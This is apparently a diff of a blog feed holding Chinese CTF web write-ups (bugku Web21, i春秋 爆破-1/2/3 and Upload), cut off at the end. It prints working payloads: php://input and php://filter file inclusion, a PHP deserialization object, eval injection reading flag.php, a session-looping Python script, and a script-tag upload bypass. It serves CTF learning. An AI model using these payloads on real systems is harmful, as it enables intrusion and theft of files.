+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>新bugku_writeup</p><a id="more"></a><h1 id="Web21"><a href="#Web21" class="headerlink" title="Web21"></a>Web21</h1><p>打开网页显示：</p><p>you are not admin !</p><p>F12查看发现注释掉的PHP代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$user = $_GET[<span class="string">"user"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"admin"</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到<code>file_get_contents()</code>函数推测可能存在文件包含(参看LFI（Local File Include）漏洞学习)，利用姿势如下:</p><ul><li>利用<code>php://inpu</code>t和POST发包<code>admin</code>绕过<code>filegetcontents($user,&#39;r&#39;)===&quot;admin&quot;)</code>。</li></ul><ul><li>利用<code>php://filter/read=convert.base64-encode/resource=class.php</code>来读取class.php。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?user=php:<span class="comment">//input&amp;file=php://filter/read=convert.base64-encode/resource=class.php</span></span><br></pre></td></tr></table></figure><p>得到回显:</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello admin!</span><br><span class="line">PD9waHANCmVycm9yX3JlcG9ydGluZyhFX0FMTCAmIH5FX05PVElDRSk7DQogDQpjbGFzcyBSZWFkey8vZjFhOS5waHANCiAgICBwdWJsaWMgJGZpbGU7DQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9TdHJpbmcoKXsNCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsNCiAgICAgICAgICAgIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJHRoaXMtPmZpbGUpOyAgICANCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gIl9fdG9TdHJpbmcgd2FzIGNhbGxlZCEiOw0KICAgIH0NCn0NCj8+</span><br></pre></td></tr></table></figure><p>Base64解密得到class.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL &amp; ~E_NOTICE);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span></span><br><span class="line"><span class="class"></span>&#123;<span class="comment">//f1a9.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))</span><br><span class="line">&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意到 <code>__toString()</code>函数执行时会读取并打印 <code>$this-&gt;file</code>的内容，构造序列化脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line">$payload = <span class="keyword">new</span> Read();</span><br><span class="line">$payload-&gt;file = <span class="string">'f1a9.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($payload);</span><br><span class="line"><span class="comment">//O:4:"Read":1:&#123;s:4:"file";s:8:"f1a9.php";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>赋值给<code>pass</code>当作为字符串是将调用<code>__toString()</code>读取f1a9.php的内容，Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?user=php:<span class="comment">//input&amp;file=class.php&amp;pass=O:4:"Read":1:&#123;s:4:"file";s:8:"f1a9.php";&#125;</span></span><br></pre></td></tr></table></figure><p>请求包：</p><pre><code>POST /index.php?user=php://input&amp;file=class.php&amp;pass=O:4:%22Read%22:1:{s:4:%22file%22;s:8:%22f1a9.php%22;} HTTP/1.1Host: 123.206.31.85:10021User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 5Origin: http://123.206.31.85:10021Connection: closeReferer: http://123.206.31.85:10021/index.php?user=php://input&amp;file=class.php&amp;pass=O:4:%22Read%22:1:{s:4:%22file%22;s:8:%22f1a9.php%22;}Cookie: PHPSESSID=273219g1daais8g64fpuuik6t5j0r4brUpgrade-Insecure-Requests: 1admin</code></pre><p>在返回包的网页查看源码即可见到：</p><pre><code>flag{db2699f21f433a78}</code></pre>]]></content>
+      
+      
       <categories>
-        <category>writeup</category>
+          
+          <category> writeup </category>
+          
       </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>i春秋writeup</title>
-    <url>/2019/11/30/i%E6%98%A5%E7%A7%8B_writeup/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>i春秋 ctf大本营_web writeup</p>
-<a id="more"></a>
-
-<h1 id="爆破-1"><a href="#爆破-1" class="headerlink" title="爆破-1"></a>爆破-1</h1><p>给了一段PHP代码，里面还有简单的正则表达式，那就来分析一下.</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\w*$/'</span>,$a ))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'ERROR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>/表示的是正则表达式的开始和结束，^或\A 匹配字符串开始位置，\w匹配任意数字或字母或下划线(a-z,A-Z,0-9,_)，*匹配0次、或1次、或多次其前面的字符(相当于可以输入多个字符、数字、或下划线)，$或者\Z匹配字符串的结束位置。所以在这里我们输入hello可以执行</p>
-<p>提示有说flag在某个变量中，还观察到var_dump($$a)，可以使用超全局变量$GLOBALS，直接在url中构造?hello=GLOBALS即可flag。</p>
-<pre><code>?hello=GLOBALS</code></pre><p>做题小结：这道题之所以能够用超全局变量，就是因为输出时又多了一个$,利用它构造一系列超全局变量,得出我们想要的信息。</p>
-<pre><code>$_SERVER 这种超全局变量保存关于报头、路径和脚本位置的信息
-$_REQUEST 用于收集 HTML 表单提交的数据
-$_POST 广泛用于收集提交 method=&quot;post&quot; 的 HTML 表单后的表单数据。
-$_GET 也可用于收集提交 HTML 表单 (method=&quot;get&quot;) 之后的表单数据</code></pre><h1 id="爆破-2"><a href="#爆破-2" class="headerlink" title="爆破-2"></a>爆破-2</h1><p>提示说flag不在变量中，用$GLOBALS查看果然不在。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
-<p>不在变量中，那就查flag.php文件，查到一个file_get_contents() 函数可以把整个文件读入一个字符串中。</p>
-<pre><code>/?hello=file_get_contents(&apos;flag.php&apos;)</code></pre><p>做题小结:可以利用三种不同的函数，都可以得出flag</p>
-<pre><code>file() 函数是把整个文件读入一个数组中，然后将文件作为一个数组返回。
-readfile() 函数读取一个文件，并写入到输出缓冲。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 &apos;@&apos; 来隐藏错误输出。
-file_get_contents() 把整个文件读入一个字符串中。</code></pre><h1 id="爆破-3"><a href="#爆破-3" class="headerlink" title="爆破_3"></a>爆破_3</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); <span class="comment">//关闭错误报告</span></span><br><span class="line">session_start();	<span class="comment">//开启session</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'./flag.php'</span>);	<span class="comment">//引入flag文件</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'nums'</span>]))&#123;</span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>] = <span class="number">0</span>;</span><br><span class="line">  $_SESSION[<span class="string">'time'</span>] = time();<span class="comment">//time() 函数返回自 Unix 纪元（January 1 1970 00:00:00 GMT）起的当前时间的秒数。</span></span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = <span class="string">'ea'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'time'</span>]+<span class="number">120</span>&lt;time())&#123;</span><br><span class="line">  session_destroy();<span class="comment">//session_destroy() 将重置 session，您将失去所有已存储的 session 数据</span></span><br><span class="line">&#125;</span><br><span class="line">$value = $_REQUEST[<span class="string">'value'</span>];<span class="comment">//$_REQUEST 用于收集 HTML 表单提交的数据</span></span><br><span class="line">$str_rand = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</span><br><span class="line">$str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)];<span class="comment">//mt_rand() 使用 Mersenne Twister 算法返回随机整数</span></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'whoami'</span>]==</span><br><span class="line">($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;<span class="comment">//a . b 	并置 	连接两个字符串 	"Hi" . "Ha" 	HiHa</span></span><br><span class="line">$_SESSION[<span class="string">'nums'</span>]++;<span class="comment">//substr() 函数返回字符串的一部分。//如果 start 参数是负数且 length 小于或等于 start，则 length 为 	0。</span></span><br><span class="line">$_SESSION[<span class="string">'whoami'</span>] = $str_rands;<span class="comment">//subst	(string,start,length)</span></span><br><span class="line">  <span class="keyword">echo</span> $str_rands;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'nums'</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>前两个if语句简单，重要的是如下语句</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$value = $_REQUEST[<span class="string">'value'</span>];</span><br><span class="line">$str_rand = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</span><br><span class="line">$str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)];</span><br></pre></td></tr></table></figure>
-
-<p>$str_rand会从a到z中随机取一个字母。$str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)]会拼凑成两个字母赋值给$str_rands。<br>然后就来观察以下代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'whoami'</span>]==</span><br><span class="line">($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;<span class="comment">//a . b 	并置 	连接两个字符串 	"Hi" . "Ha" 	HiHa</span></span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>]++;<span class="comment">//substr() 函数返回字符串的一部分。//如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</span></span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = $str_rands;<span class="comment">//substr(string,start,length)</span></span><br><span class="line">  <span class="keyword">echo</span> $str_rands;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'nums'</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>很明了了，因为$_SESSION[‘nums’] = 0，我们只需将上面的if语句循环十次（即$_SESSION[‘nums’]++循环十次），即可得出flag。<br>接下来就来构造语句，一开始的$_SESSION[‘whoami’] = ‘ea’，因此就构造</p>
-<pre><code>?value[0]=e&amp;value[1]=a</code></pre><p>又因为每执行一次，$_SESSION[‘whoami’]会变化而且值与$str_rands相同，并且每执行一次都会输出$str_rands的值，因此只要按照这个顺序输入十次即可得出flag。<br>可以写一个脚本来跑出flag</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">'http://8e7202f5492447d5ab76eb8b7e8b4b27838e55901eba4c5f.changame.ichunqiu.com'</span></span><br><span class="line"><span class="comment"># 创建一个session对象  </span></span><br><span class="line">session=requests.Session()</span><br><span class="line"><span class="comment"># 发送请求</span></span><br><span class="line">html=session.get(url+<span class="string">'?value[]=ea'</span>).text</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    html=session.get(url+<span class="string">'?value[]='</span>+ html[<span class="number">0</span>:<span class="number">2</span>]).text</span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure>
-
-<h1 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h1><p>可以上传任意文件，并且上传之后可以打开文件（源码有链接/u/xx.php），想到上传一段php代码来打开flag.php页面:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'test'</span>;</span><br></pre></td></tr></table></figure>
-
-<p>但是发现&lt;?php被过滤了，使用script绕过和大小写绕过：</p>
-<pre><code>&lt;script language=&quot;PHP&quot;&gt;
-$fh=fopen(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;),&apos;r&apos;);
-echo fread($fh,filesize(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;))); 
-fclose($fh);
-&lt;/script&gt;</code></pre><p>查看源码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'here_is_flag'</span>;</span><br><span class="line"><span class="string">'flag&#123;05b17e33-2b22-4619-a245-b71c7ef2b1f8&#125;'</span>;</span><br></pre></td></tr></table></figure>
-
-<p>PHP读取文件内容的五种方式：<br>第一种</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_path = <span class="string">"test.txt"</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists($file_path))&#123;</span><br><span class="line">	$fp = fopen($file_path,<span class="string">"r"</span>);</span><br><span class="line">	$str = fread($fp,filesize($file_path));<span class="comment">//指定读取大小，这里把整个文件内容读取出来</span></span><br><span class="line">	<span class="keyword">echo</span></span><br><span class="line">	$str = str_replace(<span class="string">"\r\n"</span>,<span class="string">"&lt;br /&gt;"</span>,$str);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>第二种</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_path = <span class="string">"test.txt"</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists($file_path))&#123;</span><br><span class="line">	$str = file_get_contents($file_path);<span class="comment">//将整个文件内容读入到一个字符串中</span></span><br><span class="line">	$str = str_replace(<span class="string">"\r\n"</span>,<span class="string">"&lt;br /&gt;"</span>,$str);</span><br><span class="line">	<span class="keyword">echo</span></span><br><span class="line">	$str;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>第三种</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_path = <span class="string">"test.txt"</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists($file_path))&#123;</span><br><span class="line">	$fp = fopen($file_path,<span class="string">"r"</span>);</span><br><span class="line">	$str = <span class="string">""</span>;</span><br><span class="line">	$buffer = <span class="number">1024</span>;<span class="comment">//每次读取 1024 字节</span></span><br><span class="line">	<span class="keyword">while</span>(!feof($fp))&#123;<span class="comment">//循环读取，直至读取完整个文件</span></span><br><span class="line">	$str.= fread($fp,$buffer);</span><br><span class="line">	&#125;</span><br><span class="line">	$str = str_replace(<span class="string">"\r\n"</span>,<span class="string">"&lt;br /&gt;"</span>,$str);</span><br><span class="line">	<span class="keyword">echo</span></span><br><span class="line">	$str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>第四种</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_path = <span class="string">"test.txt"</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists($file_path))&#123;</span><br><span class="line">	$file_arr = file($file_path);</span><br><span class="line">	<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($file_arr);$i++)&#123;<span class="comment">//逐行读取文件内容</span></span><br><span class="line">		<span class="keyword">echo</span></span><br><span class="line">		$file_arr[$i].<span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">foreach($file_arr as $value)&#123;</span></span><br><span class="line"><span class="comment">echo $value."&lt;br /&gt;";</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>第五种</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_path = <span class="string">"test.txt"</span>;</span><br><span class="line"><span class="keyword">if</span>(file_exists($file_path))&#123;</span><br><span class="line">	$fp = fopen($file_path,<span class="string">"r"</span>);</span><br><span class="line">	$str = <span class="string">""</span>;</span><br><span class="line">	<span class="keyword">while</span>(!feof($fp))&#123;</span><br><span class="line">		$str.= fgets($fp);<span class="comment">//逐行读取。如果fgets不写length参数，默认是读取1k。</span></span><br><span class="line">	&#125;</span><br><span class="line">	$str = str_replace(<span class="string">"\r\n"</span>,<span class="string">"&lt;br /&gt;"</span>,$str);</span><br><span class="line">	<span class="keyword">echo</span></span><br><span class="line">	$str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>i春秋writeup</title>
+      <link href="/2019/11/30/i%E6%98%A5%E7%A7%8B_writeup/"/>
+      <url>/2019/11/30/i%E6%98%A5%E7%A7%8B_writeup/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>i春秋 ctf大本营_web writeup</p><a id="more"></a><h1 id="爆破-1"><a href="#爆破-1" class="headerlink" title="爆破-1"></a>爆破-1</h1><p>给了一段PHP代码，里面还有简单的正则表达式，那就来分析一下.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\w*$/'</span>,$a ))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'ERROR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>/表示的是正则表达式的开始和结束，^或\A 匹配字符串开始位置，\w匹配任意数字或字母或下划线(a-z,A-Z,0-9,_)，*匹配0次、或1次、或多次其前面的字符(相当于可以输入多个字符、数字、或下划线)，$或者\Z匹配字符串的结束位置。所以在这里我们输入hello可以执行</p><p>提示有说flag在某个变量中，还观察到var_dump($$a)，可以使用超全局变量$GLOBALS，直接在url中构造?hello=GLOBALS即可flag。</p><pre><code>?hello=GLOBALS</code></pre><p>做题小结：这道题之所以能够用超全局变量，就是因为输出时又多了一个$,利用它构造一系列超全局变量,得出我们想要的信息。</p><pre><code>$_SERVER 这种超全局变量保存关于报头、路径和脚本位置的信息$_REQUEST 用于收集 HTML 表单提交的数据$_POST 广泛用于收集提交 method=&quot;post&quot; 的 HTML 表单后的表单数据。$_GET 也可用于收集提交 HTML 表单 (method=&quot;get&quot;) 之后的表单数据</code></pre><h1 id="爆破-2"><a href="#爆破-2" class="headerlink" title="爆破-2"></a>爆破-2</h1><p>提示说flag不在变量中，用$GLOBALS查看果然不在。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</span><br><span class="line"><span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>不在变量中，那就查flag.php文件，查到一个file_get_contents() 函数可以把整个文件读入一个字符串中。</p><pre><code>/?hello=file_get_contents(&apos;flag.php&apos;)</code></pre><p>做题小结:可以利用三种不同的函数，都可以得出flag</p><pre><code>file() 函数是把整个文件读入一个数组中，然后将文件作为一个数组返回。readfile() 函数读取一个文件，并写入到输出缓冲。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 &apos;@&apos; 来隐藏错误输出。file_get_contents() 把整个文件读入一个字符串中。</code></pre><h1 id="爆破-3"><a href="#爆破-3" class="headerlink" title="爆破_3"></a>爆破_3</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); <span class="comment">//关闭错误报告</span></span><br><span class="line">session_start();<span class="comment">//开启session</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'./flag.php'</span>);<span class="comment">//引入flag文件</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'nums'</span>]))&#123;</span><br><span class="line">  $_SESSION[<span class="string">'nums'</span>] = <span class="number">0</span>;</span><br><span class="line">  $_SESSION[<span class="string">'time'</span>] = time();<span class="comment">//time() 函数返回自 Unix 纪元（January 1 1970 00:00:00 GMT）起的当前时间的秒数。</span></span><br><span class="line">  $_SESSION[<span class="string">'whoami'</span>] = <span class="string">'ea'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'time'</span>]+<span class="number">120</span>&lt;time())&#123;</span><br><span class="line">  session_destroy();<span class="comment">//session_destroy() 将重置 session，您将失去所有已存储的 session 数据</span></span><br><span class="line">&#125;</span><br><span class="line">$value = $_REQUEST[<span class="string">'value'</span>];<span class="comment">//$_REQUEST 用于收集 HTML 表单提交的数据</span></span><br><span class="line">$str_rand = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</span><br><span class="line">$str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)];<span class="comment">//mt_rand() 使用 Mersenne Twister 算法返回随机整数</span></span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'whoami'</span>]==</span><br><span class="line">($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;<span class="comment">//a . b 并置 连接两个字符串 "Hi" . "Ha" HiHa</span></span><br><span class="line">$_SESSION[<span class="string">'nums'</span>]++;<span class="comment">//substr() 函数返回字符串的一部分。//如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</span></span><br><span class="line">$_SESSION[<span class="string">'whoami'</span>] = $str_rands;<span class="comment">//subst(string,start,length)</span></span><br><span class="line">  <span class="keyword">echo</span> $str_rands;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'nums'</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>前两个if语句简单，重要的是如下语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$value = $_REQUEST[<span class="string">'value'</span>];</span><br><span class="line">$str_rand = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</span><br><span class="line">$str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)];</span><br></pre></td></tr></table></figure><p>$str_rand会从a到z中随机取一个字母。$str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)]会拼凑成两个字母赋值给$str_rands。<br>然后就来观察以下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'whoami'</span>]==</span><br><span class="line">($value[<span 